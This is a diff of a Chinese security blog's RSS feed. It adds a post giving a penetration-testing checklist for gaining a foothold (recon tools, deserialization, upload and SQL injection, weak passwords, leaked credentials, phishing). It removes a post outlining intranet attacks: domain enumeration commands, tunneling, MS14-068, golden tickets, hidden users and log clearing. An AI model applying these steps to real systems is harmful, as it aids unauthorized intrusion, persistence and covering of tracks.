-      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
       <title>无星的渗透之旅速成篇（一）-https抓包</title>
       <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/</link>
       <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/</guid>
@@ -179,6 +225,37 @@
       
       
       <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>无星的渗透之旅速成篇（二）-打点</title>
+      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</guid>
+      <pubDate>Tue, 07 May 2024 12:09:00 GMT</pubDate>
+      
+      <description>&lt;p&gt;阿星还是个新人&lt;/p&gt;
+&lt;p&gt;不知道正确的渗透步骤是什么&lt;/p&gt;
+&lt;p&gt;这里看到一个打点步骤&lt;/p&gt;
+&lt;p&gt;遂记录下来&lt;/p&gt;
+&lt;h1 id=&quot;打点的基本方法&quot;&gt;&lt;a href=&quot;#打点的基本方法&quot; class=&quot;headerlink&quot; title=&quot;打点的基本方法&quot;&gt;&lt;/a&gt;打点的基本方法&lt;/h1&gt;&lt;p&gt;基本方法，无非就是信息搜集–&amp;gt;找到脆弱资产–&amp;gt;漏洞利用→getshell，说起来是很简单的。&lt;/p&gt;
+&lt;p&gt;这其中最肝的一个部分，莫过于信息搜集了，纯体力活。&lt;/p&gt;
+&lt;p&gt;当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。&lt;/p&gt;
+&lt;p&gt;虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。&lt;/p&gt;
+&lt;p&gt;1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司&lt;/p&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<p>阿星还是个新人</p><p>不知道正确的渗透步骤是什么</p><p>这里看到一个打点步骤</p><p>遂记录下来</p><h1 id="打点的基本方法"><a href="#打点的基本方法" class="headerlink" title="打点的基本方法"></a>打点的基本方法</h1><p>基本方法，无非就是信息搜集–&gt;找到脆弱资产–&gt;漏洞利用→getshell，说起来是很简单的。</p><p>这其中最肝的一个部分，莫过于信息搜集了，纯体力活。</p><p>当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。</p><p>虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。</p><p>1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司</p><p>2、拿到这堆公司和子公司的名字→oneforall来跑一遍→然后得到了一堆子域名</p><p>3、拿到这堆子域名丢给Eeyes跑一遍→得到对应子域名对应的ip和c段信息</p><p>4、将对应ip和c段丢给fofa和fscan→fofa能快速得到c段资产信息，fscan能快速扫一遍，顺便帮你打一下常用漏洞</p><p>5、如果你的运气足够好，这个时候fscan已经有漏洞爆出来了，可以直接去利用了（小概率事件），但是如果你的运气不好，就要看接下来的第6步</p><p>6、刚刚fofa得到的资产看一眼，这里可以配合ehole的指纹识别来帮助快速筛选，通过筛选敏感资产，例如shiro，fastjson等直接能够反序列化getshell的资产（小概率事件），如果你的运气好，那么这个时候已经有漏洞了，可以直接利用了，如果你的运气不好，就要看接下来的第7步</p><p>7、通过上面一番筛选，时间已经过去很久了，但是目前却毫无进展，其实心里有点郁闷，这个时候就不建议再搞了，先休息一下，调整下心态，不然后续的几天会大幅度降低工作效率，休息好了感觉又可以了，就看看下面的步骤8继续吧</p><p>8、其实经过上面的一番筛选，web这块的基本已经过完了，但是依旧还没有漏洞，说明这个系统平时自查搞的比较多，基本的高危漏洞修复已经完成了，如果是大型攻防演练，那就建议换个目标再用上面的方法轮一次，如果是就某家单位做的定向攻防，就继续看步骤9吧</p><p>9、web的过完了，虽然没有直接能够rce的系统，但是我们获得了很多形形色色的登录后台\用户登录\注册\管理员登录等等等等交互类型的资产，这些资产虽然看起来没用，但是我这里要介绍一下攻防演练的三板斧漏洞，运气好的话，这些资产还是能够派上用场的</p><p>三板斧其一 反序列化漏洞：这个不用多说，我最喜欢的漏洞，只要有了这个漏洞，基本一台机子的shell就拿到了，看到就眼睛放光，但是可遇不可求，遍地都是shiro的时代已经渐渐过去了。</p><p>三板斧其二 文件上传：这个也是老熟人了，一般我会先看看是不是白名单，是白名单的话，就看看有没有文件包含之类的漏洞能组合利用下，如果是黑名单，就把文件上传的姿势对着上传点全部来一遍，看看有没有一个能中，如果能中，那就有了一个shell（没路径连不上但是确实是shell），虽然找上传路径也是一个拦路虎，但是至少比传不上去强。</p><p>三板斧其三 sql注入：这个更加老熟人了，注入之后，低权限，直接gg，高权限，试试吧，看能不能上shell。</p><p>至于其他漏洞，攻防演练就那么几天时间，八成是用不上，建议直接放弃，就把上面三个玩精（仅仅就攻防项目来说）。</p><p>10、对各种登录系统尝试弱口令&#x2F;sql注入攻击，弱口令能登进去后台就找上传点，sql注入建议xray+burp来测，看到有戏的再上sqlmap。</p><p>还有一些信息搜集的方法，比如fofa搜关键字，title&#x3D;”单位名”等，这种方法可以自行穿插灵活使用，有时候有奇效，有时候没啥效果，看个人造化了。</p><p>还有些天选之人，直接一个弱口令登云桌面（horizon、vdi等）然后拿shell的，这种属于天赐shell，不在常规考虑范围之内，但也可以尝试。</p><p>11、弱口令如果爆不出账号密码，就考虑上网盘\github\sgk\泄露公开库搜对应人员的信息，看看好使不</p><p>12、如果还是没有用，就可以开始看公众号\app\小程序的信息</p><p>13、如果还是没有用，就要开始用域传送\备案号\ip反查网站\ssl证书\用google来搜c段</p><p>14、如果还是没有用，就用dirmap\dirsearch来对可疑的网站进行目录爆破，看看好使不</p><p>15、如果还是没有用，还可以钓鱼，发邮件也是一个体力活</p><p>16、如果还是没有用，拿上设备跟领导申请近源渗透吧</p><p>列了这么多，我就是想说明，虽然信息搜集是一项很重要的工作，是开启后渗透的基础，但这项工作是体力活真的是不争的事实，因为他没有门槛，基本谁都能做，无非就是用工具对着一项项checklist不断的去尝试而已。</p><p>因此通常意义上的快速打点，就是比谁先试完所有的checklist，虽然目前绝大部分工作都是由工具来完成，整个项目呈一个半自动化的流程，但是仍然架不住资产量的庞大，一个信息收集熟练的人，无非也就是流水线的工人而已，对着巨量的资产不断的用工具筛选而已。</p><p>而一些高端打点技巧玩得好的人，例如电话钓鱼成功率很大的人，钓鱼邮件的撰写和钓鱼样本的开发做的很牛的人，在做这些事情之前，同样需要信息搜集，而能够玩高端技巧的人是不愿意来做信息搜集的，因为他们也是从小白阶段过来的，明白信息搜集这项繁重且技术含量低的工作完全可以找别人来做。</p><p>从公司层面上来讲，要快速打点，就要投入更多的人。从个人层面上来讲，要快速打点，要忍受枯燥的打点过程，然后提升自己的工具使用速度，最好自己能够进行二次开发，把一些半自动化的步骤连接起来，优化现有的步骤，从而进一步提升效率。</p>]]></content:encoded>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
+      
+      
+      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/#disqus_thread</comments>
       
     </item>
     
@@ -318,40 +395,6 @@
       
       
       <comments>http://blog.xingxiaowu.cn/2023/09/26/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E5%85%A5%E9%97%A8/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>无星的安全之旅（四）——内网渗透</title>
-      <link>http://blog.xingxiaowu.cn/2023/09/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
-      <guid>http://blog.xingxiaowu.cn/2023/09/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
-      <pubDate>Thu, 07 Sep 2023 02:17:00 GMT</pubDate>
-      
-      <description>&lt;p&gt;内网渗透的流程&lt;/p&gt;
-&lt;p&gt;1.信息收集，寻找漏洞&lt;/p&gt;
-&lt;p&gt;2.找到漏洞，进行注马&lt;/p&gt;
-&lt;p&gt;3.获得shell&lt;/p&gt;
-&lt;p&gt;4.如果需要，则提权&lt;/p&gt;
-&lt;p&gt;5.查看网卡信息&lt;/p&gt;
-&lt;p&gt;6.打洞&lt;/p&gt;
-&lt;p&gt;7.链接并反弹shell，进行查询，寻找域管理用户，横向移动域控&lt;/p&gt;
-&lt;p&gt;8.可以查询远程权限并进行远程，后面想做什么都行了，主打一个为所欲为&lt;/p&gt;
-&lt;h1 id=&quot;内网扫描&quot;&gt;&lt;a href=&quot;#内网扫描&quot; class=&quot;headerlink&quot; title=&quot;内网扫描&quot;&gt;&lt;/a&gt;内网扫描&lt;/h1&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<p>内网渗透的流程</p><p>1.信息收集，寻找漏洞</p><p>2.找到漏洞，进行注马</p><p>3.获得shell</p><p>4.如果需要，则提权</p><p>5.查看网卡信息</p><p>6.打洞</p><p>7.链接并反弹shell，进行查询，寻找域管理用户，横向移动域控</p><p>8.可以查询远程权限并进行远程，后面想做什么都行了，主打一个为所欲为</p><h1 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h1><p><code>fscan</code></p><p><code>nmap</code></p><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>1.当前主机用户权限 whoami&#x2F;all<br>2.当前网路配置 ipconfig&#x2F;all<br>3.当前操作系统信息 systeminfo<br>4.当前进程信息 tasklist&#x2F;svc<br>5.查看补丁 vmic qfe get Caption,Csname,Descripition,HotFiixID,InstalledOn<br>6.查看当前登陆用户 query user</p><p>域环境</p><p>1.域环境 net config workstation</p><p>2.域用户信息 net user &#x2F;domain</p><p>3.域用户组 net group &#x2F;domain</p><p>4.域控主机</p><p>net group ‘domain controllers’ &#x2F;domain</p><p>net time</p><p>ipconfig(一般是dns服务器)</p><p>ping 域名</p><h1 id="内网钓鱼"><a href="#内网钓鱼" class="headerlink" title="内网钓鱼"></a>内网钓鱼</h1><p>钓鱼是最常用的手法，也是投入产出比最高的手段</p><p>可以使用<code>Cobalt Strike</code>进行邮件钓鱼</p><h1 id="打洞"><a href="#打洞" class="headerlink" title="打洞"></a>打洞</h1><p><code>frps</code>唯一真神</p><h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>常用的就是<code>fscan</code>和<code>Struts2漏洞检查工具</code></p><p><code>Struts2</code>系列工具很多，这里提供几个</p><p><a href="https://github.com/shack2/Struts2VulsTools">Struts2VulsTools</a></p><p><a href="https://github.com/Vancomycin-g/Struts2Scan">Struts2Scan</a></p><p>这是非常常用且必须的工具，通过已经公布的漏洞去做入侵，屡试不爽</p><h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><p>众所周知，现在docker部署非常常见，k8s之类的层出不穷</p><p>很有可能你攻击了半天拿下一个站，发现是docker部署的，啥权限都没有</p><p><a href="https://xz.aliyun.com/t/12495">docker逃逸先知</a></p><p>主要手段是通过挂在宿主机目录，往宿主机的目录下去放码或密钥进行登陆提权</p><h1 id="查找域信息"><a href="#查找域信息" class="headerlink" title="查找域信息"></a>查找域信息</h1><p>查找域信息，并收集信息</p><p>fscan找漏洞</p><p>尝试通过漏洞进入域控信息</p><p>如果8行</p><p>那么尝试是否可以通过<code>MS14-068</code>提升当前用户权限</p><p>再通过横向移动到域控</p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><ol><li><p>制作隐藏用户（加$）</p></li><li><p>制作黄金门票</p></li></ol><h1 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h1><h1 id="内网日志清除"><a href="#内网日志清除" class="headerlink" title="内网日志清除"></a>内网日志清除</h1><p>cmd <code>event.msc</code></p>]]></content:encoded>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
-      
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
-      
-      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
-      
-      
-      <comments>http://blog.xingxiaowu.cn/2023/09/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#disqus_thread</comments>
       
     </item>
     
